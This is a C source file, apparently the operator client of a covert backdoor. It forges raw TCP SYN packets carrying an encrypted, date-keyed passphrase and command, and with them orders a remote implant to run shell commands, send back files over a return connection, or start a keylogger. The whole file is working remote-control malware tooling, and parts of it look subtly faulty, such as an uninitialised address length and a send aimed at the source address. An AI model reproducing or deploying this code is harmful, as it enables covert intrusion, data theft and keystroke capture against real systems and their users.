#include "client.h"

// Local prototypes
static int parseConfiguration(const char filePath[], netInfo *info);
static int getUserInput(char *commandData, int command);
static void executeSystemCall(netInfo *info, char *commandData);
static void findFile(netInfo *info, char *commandData);
static void keylogger(netInfo *info);
static void sendCommand(netInfo *info, int command, char *commandData);
static int acceptReturningTcpConnection();
static int bindAddress(int port, int *socket);

int main (int argc, char **argv)
{
    int option = 0;
    int command = -1;
    char configFile[PATH_MAX] = {"../settings.conf"};
    char commandData[PATH_MAX];
    char *temp = NULL;
    netInfo info;
    
    // Change the UID/GID to 0 (raise to root)
	if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        systemFatal("You need to be root for this");
    }
    
    // Process the command line arguments
    while ((option = getopt (argc, argv, "f:c:")) != -1)
    {
        switch (option)
        {
            case 'f':
                snprintf(configFile, sizeof(configFile), "%s", optarg);
                break;
                
            case 'c':
                command = strtol(optarg, &temp, 10);
                break;
                
            default:
            case '?':
                fprintf(stderr, "Usage: %s -f [config file] -c [command type]", argv[0]);
                return 1;
        }   
    }
    
    // Read the configuration file
    parseConfiguration(configFile, &info);
    
    // If the command requires user input, obtain it
    if ((command == EXECUTE_SYSTEM_CALL) || (command == FIND_FILE))
    {
        if (!getUserInput(commandData, command))
            systemFatal("Unable to get user input");
    }

    // Determine the next function to call based on the command
    switch (command)
    {
        case EXECUTE_SYSTEM_CALL:
            executeSystemCall(&info, commandData);
            break;
            
        case FIND_FILE:
            findFile(&info, commandData);
            break;

        case KEYLOGGER:
            keylogger(&info);
            break;
        default:
            systemFatal("Unknown or missing command, check README for usage");
    }
    
    return 0;
}

static void executeSystemCall(netInfo *info, char *commandData)
{
    int backdoorSocket = 0;
    
    // Send the command to the backdoor
    sendCommand(info, EXECUTE_SYSTEM_CALL, commandData);
    
    // Wait for the response from the backdoor
    backdoorSocket = acceptReturningTcpConnection();
}

static void findFile(netInfo *info, char *commandData)
{
    int backdoorSocket = 0;
    int bytesRead = 0;
    char buffer[PATH_MAX];
    FILE *file = NULL;
    
    // Create the file for saving data
    if ((file = fopen(commandData, "w+")) == NULL)
    {
        systemFatal("Unable to create a file");
    }
    
    // Send the command to the backdoor
    sendCommand(info, FIND_FILE, commandData);
    
    // Wait for the response from the backdoor
    backdoorSocket = acceptReturningTcpConnection();
    
    // Receive the data and write it to the file
    while ((bytesRead = recv(backdoorSocket, buffer, PATH_MAX, 0)) > 0)
    {
        fwrite(buffer, sizeof(char), bytesRead, file);
    }
    
    // Close the file
    fclose(file);
}

static void keylogger(netInfo *info)
{
    // Send the command to the backdoor
    sendCommand(info, KEYLOGGER, NULL);
}

static int acceptReturningTcpConnection()
{
    int listenSocket = 0;
    int backdoorSocket = 0;
    int one = 1;
    struct sockaddr_in sa;
    socklen_t sa_len;
    
    if ((listenSocket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        systemFatal("Can't create a socket");
    }
    
    if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) == -1)
    {
        systemFatal("Cannot set socket options");
    }
    
    if (bindAddress(CONNECTION_PORT, &listenSocket) == -1)
    {
        systemFatal("Error binding the socket");
    }
    
    if (listen(listenSocket, 5) == -1)
    {
        systemFatal("Listen error");
    }
    
    if ((backdoorSocket = accept(listenSocket, (struct sockaddr *)&sa, &sa_len)) == -1)
    {
        systemFatal("Error accepting connection");
    }
    
    return backdoorSocket;
}

static int bindAddress(int port, int *socket)
{
    struct sockaddr_in address;
    bzero((char *)&address, sizeof(struct sockaddr_in));
    address.sin_family = AF_INET;
    address.sin_port = htons(port);
    address.sin_addr.s_addr = htonl(INADDR_ANY);
    
    return bind(*socket, (struct sockaddr *)&address, sizeof(address));
}

static void sendCommand(netInfo *info, int command, char *commandData)
{
    char *buffer = NULL;
    char date[11];
    char *commandBuffer = NULL;
    char *passphrase = NULL;
    char *encryptedField = NULL;
    int sock = 0;
    int one = 1;
    int packetLength = 0;
    const int *val = &one;
    struct ip *iph = NULL;
    struct tcphdr *tcph = NULL;
    struct sockaddr_in sin;
    struct sockaddr_in din;
    struct tm *timeStruct;
    time_t t;

    // Create the packet buffer and get the total length of the packet
    if (commandData != NULL)
    {
        // Get the length of the command
        packetLength = strnlen(commandData, PATH_MAX);
        // Allocate the buffer for the packet, plus 2 for command and 1 for NULL
        buffer = malloc(sizeof(struct ip) + sizeof(struct tcphdr) + packetLength + 3);
        // Allocate the command buffer, add 3 for the command plus NULL
        commandBuffer = malloc(sizeof(char) * (packetLength + 3));
    }
    else
    {
        // Allocate the buffer for the packet, plus 2 for command and 1 for NULL
        buffer = malloc(sizeof(struct ip) + sizeof(struct tcphdr) + 3);
        // Allocate the command buffer plus 1 for the NULL
        commandBuffer = malloc(sizeof(char) * 3);
    }
    
    // Finish computing the total header length and assign buffer to headers
    // Add 2 for the command and 1 for the NULL
    packetLength += sizeof(struct ip) + sizeof(struct tcphdr) + 3;
    iph = (struct ip *) buffer;
    tcph = (struct tcphdr *) (buffer + sizeof(struct ip));

    // Get the time and create the secret code
    time(&t);
    timeStruct = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
    passphrase = strdup(PASSPHRASE);
    encryptedField = encrypt_data(passphrase, date, 4);
    
    // Fill out the addess structs
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(*info->srcPort);
    din.sin_port = htons(*info->destPort);
    sin.sin_addr.s_addr = inet_addr((info->srcHost));
    din.sin_addr.s_addr = inet_addr((info->destHost));
    
    // Zero out the buffer
    memset(buffer, 0, packetLength);
    
    // IP structure
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 16;
    iph->ip_len = packetLength;
    iph->ip_id = htons(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = 6;
    iph->ip_sum = 0;
    
    iph->ip_src = sin.sin_addr;
    iph->ip_dst = din.sin_addr;
    
    // TCP structure
    tcph->th_sport = htons(*info->srcPort);
    tcph->th_dport = htons(*info->destPort);
    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
    tcph->th_ack = 0;
    tcph->th_off = 5;
    tcph->th_flags = TH_SYN;
    tcph->th_win = htons(32767);
    tcph->th_sum = 0;
    tcph->th_urp = 0;
    
    // Build the command
    commandBuffer[0] = command + 48;
    commandBuffer[1] = '|';
    commandBuffer[2] = '\0';

    // If we have command data, combine it with the command code
    if (commandData != NULL)
    {
        strlcat(commandBuffer, commandData, PATH_MAX + 2);
    }

    // Encrypt and copy the command into the packet
    encryptedField = encrypt_data(commandBuffer, date, strnlen(commandBuffer, PATH_MAX) + 1);

    memcpy(buffer + sizeof(struct ip) + sizeof(struct tcphdr), encryptedField,
           strnlen(commandBuffer, PATH_MAX) + 1);
    
    // IP checksum calculation
    iph->ip_sum = csum((unsigned short *)buffer, 5);
    
    // Create the socket for sending the packets
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1)
    {
        systemFatal("Error creating raw socket");
    }
    
    // Inform the kernel do not fill up the headers' structure, we fabricated our own
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        systemFatal("setsocketopt failed");
    }
    
    // Send the packet out
    if (sendto(sock, buffer, iph->ip_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0)
    {
        systemFatal("sendto failed");
    }
    
    // Cleanup
    if (close(sock) == -1)
    {
        systemFatal("Unable to close the raw socket");
    }
    
    free(buffer);
    free(commandBuffer);
}

static int getUserInput(char *commandData, int command)
{
    char *temp = NULL;
    
    // Prompt the user for the correct input
    if (command == EXECUTE_SYSTEM_CALL)
        printf("Enter command, max %d characters\n", PATH_MAX);
    else
        printf("Enter file name, max %d characters\n", PATH_MAX);
    
    // Obtain the entry
    if (fgets(commandData, PATH_MAX, stdin) != NULL)
    {
        // Remove the newline character if it exists
        if ((temp = strchr(commandData, '\n')) != NULL)
            *temp = '\0';
    }
    else
        return 0;
    return 1;
}

static int parseConfiguration(const char filePath[], netInfo *info)
{
    char line[PATH_MAX];
    int gotDestination = 0;
    FILE *file = NULL;
    
    // Open the configuration file
    if ((file = fopen(filePath, "r")) == NULL)
    {
        systemFatal("Unable to open the configuration file");
    }
    
    // While there are rule lines in the file
    while (fgets(line, sizeof(line), file))
    {
        // Skip commented lines
        if (line[0] == '#')
            continue;
        
        // Check to see if we have the first line, which should be destination
        if (gotDestination == 0)
        {
            if (sscanf(line, "%[^,],%d", info->destHost, info->destPort) == 2)
            {
                gotDestination = 1;
            }
            else
            {
                systemFatal("Invalid configuration file");
            }
        }
        else
        {
            // Must be the second line
            if (sscanf(line, "%[^,],%d", info->srcHost, info->srcPort) == 2)
            {
                // We have the second line, so get out
                break;
            }
            else
            {
                systemFatal("Invalid configuration file");
            }
        }
    }
    fclose(file);
    return 1;
}
